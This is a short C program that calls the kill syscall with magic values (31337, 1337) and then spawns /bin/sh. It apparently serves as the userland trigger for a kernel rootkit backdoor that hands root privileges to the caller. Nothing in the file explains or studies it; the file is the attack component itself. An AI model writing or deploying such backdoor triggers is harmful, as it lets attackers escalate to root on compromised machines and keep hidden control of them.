#include <unistd.h>
#include <stdlib.h>
#include <sys/syscall.h>

int main(int argc, char *args[])
{
	char *toSpawn[2];
	toSpawn[0] = "/bin/sh";
	toSpawn[1] = NULL;

	syscall(__NR_kill,31337,1337);
	execve(toSpawn[0],toSpawn,toSpawn[1]);
}
